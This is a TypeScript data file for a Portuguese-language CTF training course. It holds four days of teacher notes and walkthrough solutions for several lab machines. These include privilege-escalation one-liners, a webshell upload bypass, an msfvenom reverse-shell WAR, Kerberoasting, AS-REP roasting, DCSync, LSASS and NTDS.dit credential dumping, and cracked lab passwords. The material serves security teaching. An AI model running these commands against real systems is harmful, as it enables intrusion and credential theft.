export interface TeacherNote {
  day: number;
  title: string;
  objective: string;
  blocks: {
    title: string;
    duration: string;
    content: string[];
    questions?: { ask: string; expected: string }[];
  }[];
}

export interface LabSolution {
  labId: string;
  name: string;
  steps: {
    objective: string;
    command?: string;
    explanation: string;
    output?: string;
    errors?: string;
    confirmation: string;
  }[];
  mitre: string[];
}

export const teacherNotes: TeacherNote[] = [
  {
    day: 1,
    title: 'Dia 1 — Fundamentos e Prática Fácil',
    objective: 'Ao final do dia, alunos devem compreender fundamentos de redes, operar Linux com confiança e executar o primeiro scan Nmap de forma autônoma.',
    blocks: [
      {
        title: 'Bloco Matutino (3h): Redes + Linux',
        duration: '3 horas',
        content: [
          'Comece com a pergunta de abertura: "Por que TCP importa em CTF?" — engage a turma antes de qualquer conteúdo.',
          'Explique TCP/IP com analogia: TCP é como carta registrada (confirmação), UDP é como panfleto (sem garantia).',
          'Mostre scan Nmap AO VIVO em máquina do lab. Explique cada linha do output junto com a turma.',
          'Cobre portas comuns como flashcard: diga a porta, alunos respondem o serviço.',
          'Demonstre curl -I e curl -v para headers HTTP. Mostre a diferença prática.',
          'Pausa de 15 minutos após 90 minutos.',
          'Permissões Linux: mostre ls -la, explique os três grupos (dono/grupo/outros), converta para numérico ao vivo.',
          'Demo SUID: find / -perm -4000 2>/dev/null em uma máquina limpa. Mostre que python3 com SUID pode virar root.',
        ],
        questions: [
          { ask: 'Qual a diferença entre TCP e UDP?', expected: 'TCP orientado à conexão com confirmação (3-way handshake), UDP sem conexão, mais rápido mas sem garantia.' },
          { ask: 'O que faz o -sV no Nmap?', expected: 'Tenta identificar a versão do serviço em cada porta aberta.' },
          { ask: 'O que significa SUID em um binário?', expected: 'Executa com as permissões do dono do arquivo, não do usuário que chamou.' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): Web + Windows',
        duration: '3 horas',
        content: [
          'Demo ao vivo: gobuster enumerando diretórios em uma aplicação de teste.',
          'Mostre SQLi básico no Burp Suite: altere parâmetro e observe resposta.',
          'Windows Event Viewer: abra em VM Windows, filtre por 4625. Mostre como ler um logon falho.',
          'Explique Event IDs como cartões de identidade de eventos. Faça a turma montar uma tabela de memória.',
          'Wireshark: abra PCAP com credenciais FTP, filtre "ftp", mostre USER e PASS em texto claro.',
        ],
        questions: [
          { ask: 'Qual status HTTP indica recurso movido permanentemente?', expected: '301 Moved Permanently.' },
          { ask: 'Qual Event ID indica brute force em andamento?', expected: '4625 em sequência rápida de uma mesma origem.' },
          { ask: 'Como filtrar só traffic FTP no Wireshark?', expected: 'Usar filtro "ftp" no campo de filtros.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs',
        duration: '6 horas',
        content: [
          'Cap: não entregue o caminho. Pergunte "O que você nota de diferente na URL?" para guiar sem spoilar.',
          'Após encontrarem o PCAP, pergunte: "Que protocolo usa texto claro aqui?" antes de revelar FTP.',
          'Nibbles: se travarem após 15 min sem encontrar /nibbleblog, dê a dica diretamente. Tempo é recurso.',
          'Jerry: explique o conceito de WAR deployment antes de deixar tentar. O conceito é mais importante que a execução.',
          'Para labs cronometrados: defina timer visível para a turma. Aplique disciplina de prova real.',
          'Debrief após cada lab: o que funcionou, o que desperdiçou tempo.',
        ],
        questions: [
          { ask: 'Na Cap, como o Python pode virar root sem SUID?', expected: 'Capabilities: cap_setuid+ep permite que python3 chame setuid(0) e mude para root.' },
          { ask: 'Na Nibbles, como você determinou o caminho do painel admin?', expected: 'Comentário no código-fonte HTML da página inicial apontando para /nibbleblog.' },
        ]
      }
    ]
  },
  {
    day: 2,
    title: 'Dia 2 — Blue Team e Conteúdo Intermediário',
    objective: 'Alunos devem ser capazes de investigar alertas Wazuh, compreender fluxo de ataque AD básico e analisar PCAP em nível intermediário.',
    blocks: [
      {
        title: 'Bloco Matutino (3h): Wazuh + Logs',
        duration: '3 horas',
        content: [
          'Abra dashboard Wazuh (ambiente demo) — mostre a lista de alertas ao vivo.',
          'Clique em um alerta de nível 10+ e leia junto com a turma: rule ID, descrição, agente, srcip, user.',
          'Mostre como filtrar alertas pelo mesmo srcip para identificar padrão de ataque.',
          'Windows Event Viewer demo: filtre 4625 e mostre como identificar brute force por timestamp e IP.',
          'Exercício: dê à turma um arquivo CSV de alertas exportado e peça para identificar o atacante.',
        ],
        questions: [
          { ask: 'Qual nível de alerta Wazuh você investigaria primeiro?', expected: 'Level 10 ou maior — indica severidade alta ou crítica.' },
          { ask: 'Alguém faz login às 3h da manhã com conta Admin de IP externo. Qual Event ID e o que verificar?', expected: '4624 para o logon + 4672 se foram atribuídos privilégios especiais. Verificar srcip, tipo de logon (Network=3, Interactive=2).' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): AD + Forense de Disco',
        duration: '3 horas',
        content: [
          'Desenhe o fluxo Kerberos no quadro: usuário → AS_REQ → TGT → TGS → serviço.',
          'Explique AS-REP Roasting: "E se o usuário não precisa de senha para pedir TGT?"',
          'Mostre BloodHound graficamente: como ler caminhos de ataque, o que significa "CanDCSync".',
          'Forense de disco: abra Autopsy com imagem demo, mostre timeline view.',
          'Prefetch demo: procure notepad.exe, mostre que mesmo deletado o Prefetch prova execução.',
        ],
        questions: [
          { ask: 'Por que AS-REP Roasting funciona sem credenciais?', expected: 'Contas com "não requer pré-autenticação Kerberos" ativado permitem qualquer um solicitar TGT. O hash do TGT pode ser quebrado offline.' },
          { ask: 'Qual artefato Windows prova que um programa foi executado mesmo após ser deletado?', expected: 'Prefetch: C:\\Windows\\Prefetch\\ — contém nome do executável e timestamps de última execução.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs Medium',
        duration: '6 horas',
        content: [
          'Active: deixe alunos descobrirem o GPP por conta própria. Se travarem por 20min, mostre o comando smbclient mas não o arquivo.',
          'Forest: explique RPC enumeration antes de iniciar. É o primeiro passo não-óbvio.',
          'BloodHound: mostre como instalar e importar o JSON coletado antes dos labs.',
          'Para labs cronometrados: sem dicas após iniciar o timer.',
        ],
        questions: [
          { ask: 'O que é cpassword em Groups.xml?', expected: 'Senha criptografada com AES em políticas GPP. A Microsoft publicou a chave publicamente. A ferramenta gpp-decrypt decodifica qualquer cpassword.' },
        ]
      }
    ]
  },
  {
    day: 3,
    title: 'Dia 3 — Forense Avançada e Labs Difíceis',
    objective: 'Alunos executam análise de memória, identificam indicadores de malware e encadeiam técnicas avançadas de AD em labs difíceis.',
    blocks: [
      {
        title: 'Bloco Matutino (3h): Memória + Malware',
        duration: '3 horas',
        content: [
          'Execute Volatility pslist em dump demo — projete o output. Pergunte: "Esta árvore de processos parece normal?"',
          'Mostre processo oco (hollowed): svchost sem pai visível rodando de caminho incomum.',
          'malfind demo: mostre saída com região RWX e header MZ. Explique por que MZ em memória de dados é anomalia.',
          'Análise de strings: rode strings em binário de malware de amostra. Turma identifica IOCs.',
          'Base64 em string: "o que esse texto Base64 revela?" — decodifique ao vivo.',
        ],
        questions: [
          { ask: 'Qual plugin Volatility detecta código injetado?', expected: 'windows.malfind — procura regiões de memória com permissão RWX e assinatura PE (MZ header).' },
          { ask: 'Por que uma string Base64 em memória de processo é suspeita?', expected: 'Malware frequentemente usa Base64 para codificar payloads, C2 URLs ou configurações para evitar detecção por strings simples.' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): AD Avançado + Privesc',
        duration: '3 horas',
        content: [
          'BloodHound: mostre shortest paths to DA para o cenário da Blackfield.',
          'Explique SeBackupPrivilege → extração de NTDS.dit via diskshadow + robocopy.',
          'Privesc Windows: mostre SeImpersonatePrivilege → PrintSpoofer em demo.',
          'Privesc Linux: revise a Cap: python3 capability como exemplo concreto.',
        ],
        questions: [
          { ask: 'Como extrair NTDS.dit de um DC sem copiá-lo diretamente?', expected: 'Usar diskshadow para criar volume shadow copy do disco, depois robocopy para extrair ntds.dit e SYSTEM hive da shadow copy.' },
          { ask: 'O que é DCSync?', expected: 'Técnica que simula um Domain Controller fazendo replicação — extrai todos os hashes do domínio do DC real sem precisar de acesso físico.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs Hard',
        duration: '6 horas',
        content: [
          'Blackfield: avise que NTDS extraction é a parte mais trabalhosa — dê contexto de diskshadow antes de começar.',
          'Sizzle: explique SCF attack conceitualmente (arquivo que força autenticação Windows) antes do lab.',
          'Para máquinas Insane: apresente como aspiracional, não expectativa. O processo importa mais que chegar ao fim.',
          'Debrief final: mostre resolução completa de pelo menos uma máquina hard para consolidar aprendizado.',
        ]
      }
    ]
  },
  {
    day: 4,
    title: 'Dia 4 — Revisão Final e Simulados',
    objective: 'Consolidar todo o conteúdo, simular condições de prova real e garantir que alunos sabem documentar achados corretamente.',
    blocks: [
      {
        title: 'Manhã (2h): Revisão e Erros Fatais',
        duration: '2 horas',
        content: [
          'Revise a lista de erros fatais — cada aluno conta um erro cometido no curso.',
          'Mostre o cheat sheet e confirme que todos têm cópia.',
          'Exercício: dado um PCAP de 5 minutos, alunos respondem o checklist de incidente.',
          'Revisão de MITRE: mostre 5 evidências, alunos mapeiam para técnica.',
        ]
      },
      {
        title: 'Tarde (2h): Escrita de Relatório',
        duration: '2 horas',
        content: [
          'Cada aluno escreve sumário executivo de uma máquina que resolveu.',
          'Revisão em pares: o parceiro verifica se todas as afirmações têm evidência.',
          'Discussão final: "Qual foi a técnica mais difícil da semana? Por quê?"',
        ]
      },
      {
        title: 'Noite (8h): Speed Runs Cronometrados',
        duration: '8 horas',
        content: [
          'Regras de prova real: sem dicas após timer iniciar, documentação obrigatória.',
          'Objetivo não é completar tudo — é ser sistemático e documentar bem o que tentar.',
          'Após cada lab: 10 minutos de debrief coletivo.',
        ]
      }
    ]
  }
];

export const labSolutions: LabSolution[] = [
  {
    labId: 'cap',
    name: 'Cap — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração inicial',
        command: 'nmap -sC -sV -oN scan.txt 10.10.10.245',
        explanation: 'Scan padrão de CTF: scripts padrão (-sC), versão de serviço (-sV), salvar output (-oN).',
        output: 'PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1\n80/tcp open  http    gunicorn',
        errors: 'Se o host parece offline: adicionar -Pn',
        confirmation: 'Portas 22 (SSH) e 80 (HTTP) abertas. Aplicação web rodando com gunicorn (Python/Flask).'
      },
      {
        objective: 'Exploração web — manipulação de URL',
        command: 'curl -s http://10.10.10.245/data/0',
        explanation: 'A aplicação web mostra capturas PCAP. O número no URL (/data/0) identifica qual captura. Tente outros valores.',
        output: 'Resposta JSON com informações do PCAP',
        confirmation: 'Altere para /data/1, /data/2 — você está vendo capturas de OUTROS usuários. Download da captura em /download/2.'
      },
      {
        objective: 'Análise do PCAP',
        command: 'Abrir no Wireshark, filtro: ftp',
        explanation: 'FTP transmite credenciais em texto claro. Filtrar "ftp" mostra comandos USER e PASS.',
        output: 'USER nathan\nPASS Buck3tH4TF0RM3!',
        confirmation: 'Credenciais: nathan / Buck3tH4TF0RM3!'
      },
      {
        objective: 'Acesso SSH com credenciais encontradas',
        command: 'ssh nathan@10.10.10.245',
        explanation: 'Usar as credenciais FTP encontradas para autenticar via SSH.',
        confirmation: 'Shell como nathan. Flag em /home/nathan/user.txt'
      },
      {
        objective: 'Enumeração de privilégios — capabilities',
        command: 'python3.8 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
        explanation: 'getcap -r / revela que python3.8 tem cap_setuid+ep. Essa capability permite que python3.8 chame setuid(0) sem ser root — equivalente a SUID para este propósito.',
        output: 'root@cap:/home/nathan#',
        confirmation: 'Shell como root. Flag em /root/root.txt'
      }
    ],
    mitre: ['T1040 — Network Sniffing', 'T1548.001 — Setuid and Setgid']
  },
  {
    labId: 'nibbles',
    name: 'Nibbles — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração — código fonte',
        command: 'curl -s http://10.10.10.75 | grep -i nibble',
        explanation: 'O código-fonte da página inicial contém comentário HTML revelando /nibbleblog.',
        output: '<!-- /nibbleblog/ directory. Nothing interesting here! -->',
        confirmation: 'Caminho /nibbleblog descoberto sem força bruta.'
      },
      {
        objective: 'Identificar painel administrativo',
        command: 'gobuster dir -u http://10.10.10.75/nibbleblog/ -w common.txt',
        explanation: 'Enumeração do subdiretório revela /admin.php.',
        confirmation: 'Admin panel em /nibbleblog/admin.php'
      },
      {
        objective: 'Autenticação',
        command: 'Credenciais: admin / nibbles',
        explanation: 'Nome da máquina é uma dica. Senha é o nome do blog: nibbles.',
        errors: 'ATENÇÃO: após ~5 tentativas erradas o IP é bloqueado temporariamente. Não force bruta.',
        confirmation: 'Acesso ao painel Nibbleblog admin.'
      },
      {
        objective: 'Upload de webshell via plugin',
        command: 'Plugins → My Image → upload PHP webshell como image.php (bypass: Content-Type: image/jpeg)',
        explanation: 'Plugin My Image aceita upload mas não valida a extensão — apenas o Content-Type.',
        output: 'Shell em: /nibbleblog/content/private/plugins/my_image/image.php?cmd=id',
        confirmation: 'RCE como www-data. Escalone para shell reversa.'
      },
      {
        objective: 'Escalada de privilégio via sudo',
        command: 'sudo /home/nibbler/personal/stuff/monitor.sh',
        explanation: 'sudo -l revela NOPASSWD para /home/nibbler/personal/stuff/monitor.sh. O script não existe — crie com payload de shell reversa.',
        confirmation: 'Root shell. Flag em /root/root.txt'
      }
    ],
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1548.003 — Sudo and Sudo Caching']
  },
  {
    labId: 'jerry',
    name: 'Jerry — Resolução Didática',
    steps: [
      {
        objective: 'Identificar Tomcat Manager',
        command: 'nmap -sV -p 8080 10.10.10.95',
        explanation: 'Nmap revela Apache Tomcat na porta 8080. Manager em /manager/html.',
        confirmation: 'Tomcat 7.0.88 identificado.'
      },
      {
        objective: 'Credenciais padrão',
        command: 'tomcat / s3cret',
        explanation: 'Tomcat tem lista conhecida de credenciais padrão. tomcat:s3cret é uma das mais comuns.',
        errors: 'Se bloqueado (403), limpe cookies ou use IP diferente.',
        confirmation: 'Acesso ao Tomcat Manager /manager/html'
      },
      {
        objective: 'Gerar WAR malicioso',
        command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<SEU_IP> LPORT=4444 -f war -o shell.war',
        explanation: 'msfvenom cria arquivo WAR com JSP que executa shell reversa. O Tomcat Manager permite deploy de WARs.',
        confirmation: 'shell.war gerado. Inicie listener: nc -lvnp 4444'
      },
      {
        objective: 'Deploy e execução',
        command: 'Upload via Manager interface → acesse /shell/',
        explanation: 'Após deploy, navegar para a URL da aplicação ativa o JSP e conecta ao listener.',
        output: 'Shell como nt authority\\system',
        confirmation: 'SYSTEM shell. Flags em C:\\Users\\Administrator\\Desktop\\flags\\'
      }
    ],
    mitre: ['T1190 — Exploit Public-Facing Application', 'T1059.007 — JavaScript/JScript (JSP)']
  },
  {
    labId: 'active',
    name: 'Active — Resolução Didática',
    steps: [
      {
        objective: 'Enumeração SMB anônima',
        command: 'smbclient -L //10.10.10.100 -N',
        explanation: 'Sessão nula SMB revela shares. O share Replication é acessível anonimamente.',
        confirmation: 'Share Replication disponível sem autenticação.'
      },
      {
        objective: 'Encontrar Groups.xml',
        command: 'smbclient //10.10.10.100/Replication -N\n# Baixe recursivamente: prompt OFF; recurse ON; mget *',
        explanation: 'Navegar em Policies/{GUID}/MACHINE/Preferences/Groups/ para encontrar Groups.xml.',
        output: 'Groups.xml com campo cpassword',
        confirmation: 'Arquivo encontrado com cpassword da conta SVC_TGS.'
      },
      {
        objective: 'Descriptografar GPP password',
        command: 'gpp-decrypt AQAAANCMnd8BFdERjHoAwE...',
        explanation: 'Microsoft publicou a chave AES usada para criptografar cpassword em GPP. gpp-decrypt usa essa chave para reverter.',
        output: 'GPPstillStandingStrong2k18',
        confirmation: 'Credenciais: SVC_TGS / GPPstillStandingStrong2k18'
      },
      {
        objective: 'Kerberoasting',
        command: 'GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile kerb.txt',
        explanation: 'Com credenciais válidas, solicitar tickets de serviço para contas com SPN. Administrator tem SPN.',
        confirmation: 'Hash Kerberoast do Administrator obtido.'
      },
      {
        objective: 'Crack e acesso total',
        command: 'hashcat -m 13100 kerb.txt rockyou.txt\npsexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100',
        explanation: 'hashcat quebra o TGS offline. psexec usa credenciais para shell SYSTEM.',
        output: 'C:\\Windows\\system32>',
        confirmation: 'SYSTEM shell. user.txt em C:\\Users\\SVC_TGS\\Desktop\\, root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1552.006 — Group Policy Preferences', 'T1558.003 — Kerberoasting']
  },
  {
    labId: 'forest',
    name: 'Forest — Resolução Didática',
    steps: [
      {
        objective: 'Enumerar usuários via RPC sem credenciais',
        command: 'rpcclient -U "" -N 10.10.10.161\n> enumdomusers',
        explanation: 'rpcclient com sessão nula enumera usuários do domínio em DCs mal configurados. Salve a lista de usernames.',
        confirmation: 'Lista de usuários incluindo svc-alfresco e outros.'
      },
      {
        objective: 'AS-REP Roasting',
        command: 'GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -outputfile asrep.txt',
        explanation: 'Verifica cada usuário da lista. svc-alfresco não requer pré-autenticação Kerberos — hash obtido.',
        confirmation: 'Hash AS-REP do svc-alfresco.'
      },
      {
        objective: 'Crack do hash',
        command: 'hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt',
        explanation: 'Hashcat -m 18200 = Kerberos AS-REP etype 23.',
        output: 's3rvice',
        confirmation: 'Credenciais: svc-alfresco / s3rvice'
      },
      {
        objective: 'Mapear AD com BloodHound',
        command: 'bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -ns 10.10.10.161 -c All',
        explanation: 'Coleta relações do AD. svc-alfresco → Account Operators → pode adicionar usuários a Exchange groups → WriteDACL no domínio → DCSync.',
        confirmation: 'Caminho de ataque identificado no BloodHound.'
      },
      {
        objective: 'DCSync para obter hash do Administrator',
        command: 'net group "Exchange Windows Permissions" svc-alfresco /add /domain\nsecretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161',
        explanation: 'Adicionando svc-alfresco ao grupo Exchange Windows Permissions, ele ganha WriteDACL no domínio. DCSync extrai todos os hashes.',
        output: 'Administrator:500:HASH:HASH:::',
        confirmation: 'Pass-the-hash com Administrator para root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1558.004 — AS-REP Roasting', 'T1484.001 — Domain Policy Modification: Group Policy Modification', 'T1003.006 — DCSync']
  },
  {
    labId: 'blackfield',
    name: 'Blackfield — Resolução Didática',
    steps: [
      {
        objective: 'Enumerar usernames via SMB',
        command: 'smbclient //10.10.10.192/profiles$ -N\n# ls → lista de diretórios = usernames',
        explanation: 'Share profiles$ acessível anonimamente. Cada diretório tem o nome de um usuário do domínio.',
        confirmation: 'Lista de ~314 usernames extraída dos diretórios.'
      },
      {
        objective: 'AS-REP Roasting',
        command: 'GetNPUsers.py blackfield.local/ -usersfile users.txt -no-pass',
        explanation: 'Testar cada username. Usuário "support" não requer pré-autenticação.',
        confirmation: 'Hash AS-REP do support obtido.'
      },
      {
        objective: 'Crack e enumeração BloodHound',
        command: 'hashcat -m 18200 hash.txt rockyou.txt\n# Resultado: #00^BlackKnight',
        explanation: 'Com credenciais do support, rodar BloodHound. support tem ForceChangePassword sobre audit2020.',
        confirmation: 'Caminho: support → ForceChangePassword → audit2020'
      },
      {
        objective: 'Alterar senha do audit2020',
        command: 'net rpc password audit2020 "NovaS3nha!" /user:support%"#00^BlackKnight" /S 10.10.10.192',
        explanation: 'Com ForceChangePassword, alteramos a senha do audit2020 sem conhecer a atual.',
        confirmation: 'Acesso ao audit2020. SMB → share forensic → lsass.zip'
      },
      {
        objective: 'Extrair credenciais do LSASS dump',
        command: 'pypykatz lsa minidump lsass.DMP',
        explanation: 'lsass.zip contém dump de memória do processo LSASS. pypykatz extrai hashes NTLM.',
        output: 'svc_backup:HASH',
        confirmation: 'Hash NTLM do svc_backup.'
      },
      {
        objective: 'Extrair NTDS.dit via SeBackupPrivilege',
        command: 'diskshadow /s shadow.txt\nrobocopy /b \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ . ntds.dit',
        explanation: 'svc_backup tem SeBackupPrivilege. Usar diskshadow para criar shadow copy e robocopy com /b (backup) para extrair ntds.dit e SYSTEM hive.',
        confirmation: 'ntds.dit + SYSTEM hive extraídos.'
      },
      {
        objective: 'Dump de todos os hashes',
        command: 'secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL',
        explanation: 'secretsdump.py processa o ntds.dit offline e extrai todos os hashes do domínio.',
        output: 'Administrator:500:HASH:NTLMHASH:::',
        confirmation: 'Pass-the-hash para Administrator. root.txt em C:\\Users\\Administrator\\Desktop\\'
      }
    ],
    mitre: ['T1558.004 — AS-REP Roasting', 'T1555 — Credentials from Password Stores', 'T1003.003 — NTDS']
  }
];
